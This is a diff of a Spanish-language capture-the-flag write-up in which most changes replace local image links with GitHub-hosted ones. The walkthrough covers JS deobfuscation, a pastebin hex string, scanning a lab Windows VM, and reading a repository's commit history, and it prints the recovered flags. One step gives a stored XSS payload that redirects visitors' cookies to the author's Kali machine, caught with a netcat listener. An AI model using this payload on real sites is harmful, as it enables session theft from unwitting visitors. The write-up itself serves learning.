@@ -185,15 +185,15 @@ Al leer la hint del reto vemos que es un criptograma. Buscamos un desencriptador
 
 Descargamos el archivo comprimido que está en la descripción del reto y lo descomprimimos en una VM de Kali. Al revisar lo que había dentro del archivo comprimido encontramos lo siguiente
 
-<img src=":/20c9fa009e3f4cc786b93caec7596578" alt="9f7288734e5eefc18700d1e4cc529b48.png" width="457" height="175" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199790667-884f53cf-6618-4b0f-8b5b-cdfcac3b6481.png)
 
 Al abrir el index.html en el navegador de Firefox vemos la página web de Kim. Si analizamos el código fuente de la página podemos ver que hay un tag de script que parece tener código ofuscado.
 
-<img src=":/5b310873da394f6bac2efdbbc23e0237" alt="8004eb1800505cac01f6a6331193dfe1.png" width="698" height="335" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199790773-04c105bf-cde9-45e2-963b-64a94667e759.png)
 
 Copiamos este código y lo pegamos en una herramienta en linea para darle formato a código sin formato de JS como js-beautify y ahí encontramos la flag
 
-<img src=":/d9185cb6aae442d8954cde591cc1cf21" alt="afb960013a73c7d1361ccd53aed08ff9.png" width="764" height="287" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199790803-4299da7a-984b-4082-8408-7b70d76e285c.png)
 
 **flag{Do\_You\_Know_??\_I\_4m\_Kim\_Anime\_Watcher\_And\_Web\_Applications_Hacker}**
 
@@ -201,19 +201,19 @@ Copiamos este código y lo pegamos en una herramienta en linea para darle format
 
 Descargamos el archivo comprimido que está en la descripción del reto y lo descomprimimos en una VM de Kali. Al enlistar los archivos que estaban comprimidos encontramos uno con un nombre muy particular
 
-<img src=":/bb5df4c38cf0412e9e4e16aba8543bef" alt="07ddd603b340860a96c40503b3c3f50e.png" width="415" height="275" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199790846-4351b0ca-2348-4321-9ebc-2fd5c00dd5c4.png)
 
 Usando el comando strings sobre ese archivo encontramos un link de pastebin
 
-<img src=":/5f375cda74e74ec0bee9054068ba22c0" alt="44d311234ee98b9c25e12d4b2b72a89e.png" width="262" height="192" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199790880-5e9c9be1-0573-45be-a40c-6f196320c69b.png)
 
 Al navegar al link de pastebin encontramos un código de Python que tiene una cadena de texto que parece ser hexadecimal
 
-![201cf26992e0d0fc7bbd7594ebd0d44c.png](:/8a4551b77cf04cf89296dc4a5d8c9b50)
+![image](https://user-images.githubusercontent.com/70277640/199790914-3cc3beae-6972-4497-9ba1-3c9272a11abd.png)
 
 Si llevamos esta cadena hexadecimal a cyberchef para decodificarla obtenemos la flag
 
-<img src=":/1686a5c790f74e11a75a51f65486e11f" alt="95845c0dd4bf4e41209045e9cee540bf.png" width="497" height="283" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199790939-390480aa-93ce-41d0-a9e9-64d0b49f7b12.png)
 
 **flag{1337_4l11111f3}**
 
@@ -225,27 +225,27 @@ Para realizar estos retos es necesario utilizar la VM que nos hicieron descargar
 
 En nuestra VM de Kali escaneamos la VM de Windows para ver qué puertos tiene abiertos
 
-<img src=":/fcd989b6bb1d4fedb06ca5b05f0b434c" alt="634c62c8228d1bf4105531b47bdba06d.png" width="478" height="384" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199791025-d0ee21d9-1ce3-4115-9f47-0c2ff5059776.png)
 
 Al navegar a la IP de la VM de Windows en un navegador web podemos ver la página web que está montada en la máquina
 
-<img src=":/70d211e2ac3b4d6fae8ed77cda0eccc5" alt="d367d8fceb3fca059a7283efb57b250e.png" width="614" height="313" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199791046-ae0abf00-d3c1-424f-b7f9-1c71fbef11a5.png)
 
 Al revisar el robots.txt descubrimos que la página fue hecha utilizando WordPress (wp) y también descubrimos el nombre del sitio web que hostea la VM de Windows (esto lo necesitaremos para otro reto)
 
-![432292d57d144e00a01fb07d00d4cc10.png](:/a5ef6cda000b461dac03484ae76356de)
+![image](https://user-images.githubusercontent.com/70277640/199791063-84c62773-5366-4f5b-af1c-01f018b7aa77.png)
 
 Sabiendo que WordPress utiliza mayormente PHP y relacionando eso con el nombre del reto (index) podemos asumir que la página tiene un archivo index.php. al navegar a http://192.168.2.4/index.php encontramos una página que coincide con lo que se nos dice en la descripción del reto
 
-<img src=":/5a3dec6f2aad4ac699db86852d395220" alt="f79eb1264aa270b9c93d757a81b674fe.png" width="405" height="159" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199791095-5c47598e-fbf3-4305-b0ea-ccfc65080946.png)
 
 Como ya hice la inyección de XSS a la página no me aparece el campo para ingresar texto, pero esta página originalmente lo que hace es que todo lo que introduzcamos al campo de texto y guardemos se reflejará en la página, aun cuando vayamos a otra ruta y volvamos a esta misma página. Sabiendo esto, podemos intentar hacer un Stored XSS con `<script> window.location='http://192.168.2.10/?c=' + document.cookie; </script>` para enviarnos la cookie de la página a un listener que levantaremos en Kali. Al revisar el código fuente de la página para ver si logramos inyectar el script podemos ver que esto funcionó y ahora cada vez que ingresamos a esta página se enviará la cookie a nuestra VM de Kali
 
-<img src=":/0a7e065ecac14a63b7ed5def2fd7f71d" alt="d786b650098a667b63e600fd359f6cfe.png" width="480" height="472" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199791117-2312c764-42c5-425e-9c4e-9fe833d84f75.png)
 
 Para poder recibir la cookie levantamos un listener en nuestra VM de Kali con `nc -lnvp 80` y volvemos a ingresar a la página de index.php en nuestro navegador para obtener la cookie, que a su vez contiene la flag
 
-<img src=":/6eeec0f65abd4e5eb1833612050d3c7b" alt="0fead0b32457359a7ba4afa30352eefb.png" width="821" height="193" class="jop-noMdConv">
+![image](https://user-images.githubusercontent.com/70277640/199791144-794d7461-3650-4c6e-9fdc-0b3866052159.png)
 
 Ya lo único que necesitamos hacer es decodificar lo que está codificado como URL para obtener la flag
 
@@ -255,22 +255,22 @@ Ya lo único que necesitamos hacer es decodificar lo que está codificado como U
 
 Como vimos en el robots.txt, encontramos el nombre de la página web
 
-<img src=":/6964171c3c854a81872de83717d68c46" alt="cd068f2795d29b3f699dfdc8dfdf67b4.png" width="437" height="95">
+![image](https://user-images.githubusercontent.com/70277640/199791240-0e629b74-2e16-43d7-ba1c-123dc1849788.png)
 
-Agregamos esta IP y el dominion a /etc/hosts para poder navegar a la página a través de Firefox
+Agregamos esta IP y el dominio a /etc/hosts para poder navegar a la página a través de Firefox
 
-![269d7f5deed1c376ef0fd8999fe0948b.png](:/2b4bc2a50db84af19b794600ff11191d)
+![image](https://user-images.githubusercontent.com/70277640/199791278-c03fb7e0-64d0-4577-a425-cefb93383792.png)
 
 Una vez que hacemos esto podemos ver la página web que se está hosteando en la VM de Windows y al ir al final de la página podemos ver links a Facebook y a GitHub
 
-<img src=":/15a412dd2f594ed89f6140bf6abb8e0d" alt="4fe11378db4156f54800d77b06446592.png" width="530" height="314">
+![image](https://user-images.githubusercontent.com/70277640/199791316-743a51a0-6b09-42e3-a4a5-5bd427399f81.png)
 
 Al presionar el link somos redireccionados a la página de GitHub del usuario GeoHome, que tiene un repositorio GeoAPI
 
-<img src=":/57aacd9cab4d429d88982b1f96d69faf" alt="a6b0b5f586013132b115350738293b04.png" width="656" height="307">
+![image](https://user-images.githubusercontent.com/70277640/199791352-2b648675-489f-428c-a5b9-6d0164ac8ee6.png)
 
 Al entrar al repositorio y ver el historial de commits encontraremos un commit cuyo título es la flag de este reto
 
-<img src=":/e6061db4027549dba8d4607113b7e279" alt="c3bd3768ab18b59bb8cc0d3e8763a2e1.png" width="759" height="269">
+![image](https://user-images.githubusercontent.com/70277640/199791379-ef7ded06-9a9a-48fa-aaba-5f940caf3f49.png)
 
  **FLAG{ALWAYS\_CHECK\_COMMITS} **
